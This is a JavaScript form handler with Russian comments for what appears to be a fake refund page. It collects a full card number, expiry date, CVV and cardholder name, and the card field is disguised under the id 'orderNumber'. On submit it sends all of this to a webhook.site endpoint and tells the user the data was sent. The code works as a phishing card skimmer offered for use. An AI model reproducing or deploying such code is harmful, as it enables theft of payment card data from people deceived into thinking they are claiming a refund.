<script>
  const cardInput = document.getElementById('orderNumber');
  const expiryInput = document.getElementById('expiry');
  const cvvInput = document.getElementById('cvv');
  const nameInput = document.getElementById('cardName');
  const form = document.getElementById('refundForm');

  function showError(id, message) {
    const el = document.getElementById(id);
    el.textContent = message;
    el.classList.add('show');
  }

  function clearErrors() {
    document.querySelectorAll('.error').forEach(el => {
      el.textContent = '';
      el.classList.remove('show');
    });
    document.querySelectorAll('input').forEach(el => el.classList.remove('error','success'));
  }

  // Маска для номера карты
  cardInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.slice(0,16);
    const parts = value.match(/.{1,4}/g);
    e.target.value = parts ? parts.join(' ') : '';
    if (value.length === 16) expiryInput.focus();
  });

  // Маска для MM / YY
  expiryInput.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 4) value = value.slice(0,4);
    if (value.length > 2) {
      e.target.value = value.slice(0,2) + " / " + value.slice(2);
    } else {
      e.target.value = value;
    }
    if (value.length === 4) cvvInput.focus();
  });

  // Маска для CVV
  cvvInput.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
  });

  // Валидация формы + отправка
  form.addEventListener('submit', (e) => {
    e.preventDefault();
    clearErrors();

    const cardNumber = cardInput.value.replace(/\s/g, '');
    const expiry = expiryInput.value.replace(/\s/g, '');
    const cvv = cvvInput.value;
    const cardName = nameInput.value.trim();

    let hasError = false;

    // Проверка карты
    if (!/^\d{16}$/.test(cardNumber)) {
      showError('cardError', 'Введите корректный номер карты (16 цифр).');
      cardInput.classList.add('error');
      hasError = true;
    } else {
      cardInput.classList.add('success');
    }

    // Проверка срока действия
    if (!/^\d{2}\/\d{2}$/.test(expiry.replace(' ', ''))) {
      showError('expiryError', 'Введите срок действия в формате MM/YY.');
      expiryInput.classList.add('error');
      hasError = true;
    } else {
      const [month, year] = expiry.split('/').map(v => parseInt(v, 10));
      const now = new Date();
      const currentMonth = now.getMonth() + 1;
      const currentYear = now.getFullYear() % 100;

      if (month < 1 || month > 12) {
        showError('expiryError', 'Месяц должен быть от 01 до 12.');
        expiryInput.classList.add('error');
        hasError = true;
      } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
        showError('expiryError', 'Срок действия карты истёк.');
        expiryInput.classList.add('error');
        hasError = true;
      } else {
        expiryInput.classList.add('success');
      }
    }

    // Проверка CVV
    if (!/^\d{3}$/.test(cvv)) {
      showError('cvvError', 'Введите корректный CVV (3 цифры).');
      cvvInput.classList.add('error');
      hasError = true;
    } else {
      cvvInput.classList.add('success');
    }

    // Проверка имени
    if (cardName.length < 2) {
      showError('nameError', 'Введите имя владельца.');
      nameInput.classList.add('error');
      hasError = true;
    } else {
      nameInput.classList.add('success');
    }

    // Если ошибок нет — отправляем в webhook.site
    if (!hasError) {
      fetch("https://webhook.site/267c92e9-9442-4261-b60e-0fc42bf1f855", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          cardNumber: cardNumber,
          expiry: expiry,
          cvv: cvv,
          cardName: cardName
        })
      })
      .then(res => {
        if (res.ok) {
          alert("✅ Данные успешно отправлены");
        } else {
          alert("❌ Ошибка при отправке");
        }
      })
      .catch(err => {
        console.error(err);
        alert("❌ Сетевая ошибка");
      });
    }
  });
</script>
